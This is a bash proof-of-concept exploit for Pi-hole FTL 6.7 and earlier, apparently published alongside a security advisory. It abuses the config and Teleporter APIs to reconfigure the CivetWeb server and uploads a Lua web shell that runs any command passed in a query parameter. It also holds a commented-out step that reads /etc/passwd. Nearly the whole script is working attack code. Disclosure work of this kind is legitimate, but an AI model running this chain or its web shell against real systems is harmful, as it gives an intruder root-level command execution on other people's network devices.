#!/bin/bash
#
# LinnemanLabs - pi-hole poc advancedOpts put_delete_auth_file, serve_all, document_root, web-session to code exec
#
# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
# https://github.com/linnemanlabs/advisories/
#
# https://github.com/pi-hole/FTL/security/advisories/GHSA-2794-hrj8-5jg9
#
# workaround for the civetweb patch:
#  - stage an auth-digest file using Teleporter
#  - point put_delete_auth_file to our staged digest 
#  - enable serve_all
#  - upload our lua, authenticating with the put_delete_auth_file digest 
#  - curl the lua cmd shell
#
# works on FTL <= 6.7
#
PIPASS="password"
PIHOST="http://pi.hole"
LUACMD="hostname;uptime;id;grep ^Cap /proc/self/status;pihole version"
do_cleanup=false

while (($#)); do
    case $1 in
        --cleanup) do_cleanup=true ;;
        *) printf 'unknown argument: %s\n' "$1" >&2; exit 2 ;;
    esac
    shift
done

do_cleanup() {
  # clean-up
  echo "[*] cleaning up"

  # delete /etc/pihole/x.lua using the API
  curl -sk --digest -u "${webuser}:${webpass}" -X DELETE "${PIHOST}/etc/pihole/x.lua"
  echo "[*] deleting /etc/pihole/x.lua"

  # restore config
  webserverOpts='{"serve_all":false,"advancedOpts":[]}'
  res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH "${PIHOST}/api/config" -H 'Content-Type: application/json' \
    -d "{\"config\":{\"webserver\":${webserverOpts}}}" )"
  resadv="$( echo "${res}" | jq -c '{ serve_all: .config.webserver.serve_all, advancedOpts: .config.webserver.advancedOpts }' )"
  if [ "${resadv}" != "${webserverOpts}" ];then
    echo "[-] warning: unexpected webserver options active: ${resadv}"
  fi

  echo "[*] clean-up finished"
}

# Login (skip in no-password mode)
SID="$( curl -sk -X POST "${PIHOST}/api/auth" -H 'Content-Type: application/json'  -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
if [ "${SID}x" == "x" ] || [ "${SID}" == "null" ];then
  echo "[-] no SID - pi-hole up and password correct?"
  exit 1
fi
echo "[*] session established with ${PIHOST} sid=${SID:0:8}****"

# Fetch pi.hole realm
res="$( curl -sk -H "X-FTL-SID: $SID" "${PIHOST}/api/config/webserver/domain" )"
realm="$(echo "${res}" | jq -r ".config.webserver.domain" )"

if [ "${realm}x" == "x" ] || [ "${realm}" == "null" ];then
  echo "[-] no config.webserver.domain received. full response: ${res}"
  exit 1
fi

# Generate password for put_delete_auth_file
webuser="x"
webpass="$( mktemp -u XXXXXXXXXXXXXXXXXXXX )"
hapass="$( printf "%s:%s:%s" "$webuser" "$realm" "$webpass" | md5sum | awk '{ print $1 }' )"
# echo "[*] re-usable auth (user:realm:pass): ${webuser}:${realm}:${webpass}"

# Create crafted teleporter file so we can stage a valid put_delete_auth_file file
# (can also skip this and just stage it locally if you have ssh access)
printf "%s:%s:%s\n" "$webuser" "$realm" "$hapass" > dhcp.leases
tar -zcf teleport.dhcp.tar.gz dhcp.leases
echo "[*] created put_delete_auth_file dhcp.leases teleporter file"

# POST the crafted .tar.gz to teleporter (can skip this if you staged it locally already)
res="$( curl -sk -H "X-FTL-SID: $SID" -X POST "${PIHOST}/api/teleporter" -F "file=@teleport.dhcp.tar.gz" 2>&1 )"
resfile="$( echo "${res}" | jq -r .files.[0] )"
if [ "${resfile}" != "/etc/pihole/dhcp.leases" ];then
  echo "[-] unexpected result staging /etc/pihole/dhcp.leases through Teleporter: ${res}"
fi
echo "[*] staged /etc/pihole/dhcp.leases through Teleporter"

# Set CivetWeb advancedOpts put_delete_auth_file, document_root, and serve_all
webserverOpts='{"serve_all":true,"advancedOpts":["put_delete_auth_file=/etc/pihole/dhcp.leases","document_root=/"]}'
res="$( curl -sk -H "X-FTL-SID: $SID" -X PATCH "${PIHOST}/api/config" -H "Content-Type: application/json" \
    -d "{\"config\":{\"webserver\":${webserverOpts}}}" 2>&1 )"
resadv="$( echo "${res}" | jq -c '{ serve_all: .config.webserver.serve_all, advancedOpts: .config.webserver.advancedOpts }' )"
if [ "${resadv}" != "${webserverOpts}" ];then
  echo "[-] unexpected advancedOpts result: ${resadv}"
  exit 1
fi
echo "[*] set advancedOpts: ${resadv}"

# give FTL time to restart
sleep 10

# create lua web-shell
cat > x.lua <<'EOF'
local cmd = mg.get_var(mg.request_info.query_string or "", "cmd") or "id"

local f = io.popen(cmd .. " 2>&1")
local out = f and f:read("*a") or "popen-failed"
if f then f:close() end
mg.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n")
mg.write(out)
EOF

# PUT x.lua
res="$( curl -sk --digest -u "${webuser}:${webpass}" -X PUT --data-binary @x.lua -w '%{http_code}' "${PIHOST}/etc/pihole/x.lua" 2>&1 )"
if [ "${res}" == "200" ];then
  echo "[*] staged /etc/pihole/x.lua"
else
  echo "[-] unexpected result while staging x.lua: ${res}"
  exit 1
fi

# call x.lua
if [ "${LUACMD}x" != "x" ];then
  res="$( curl -Gsk "${PIHOST}/etc/pihole/x.lua" --data-urlencode "cmd=${LUACMD}" )"
  printf "[+] called x.lua LUACMD cmd=${LUACMD}:\n%s\n" "$res"
fi

# # view /etc/passwd
# res="$( curl -sk "${PIHOST}/etc/passwd" | grep -E "/bin/.*sh" )"
# printf "[+] accessed /etc/passwd:\n%s\n" "$res"

# clean-up
if [ "${do_cleanup}" == "true" ];then
  do_cleanup
else
  echo "[-] skipping cleanup (use --cleanup to enable)"
fi

echo "[+] done"
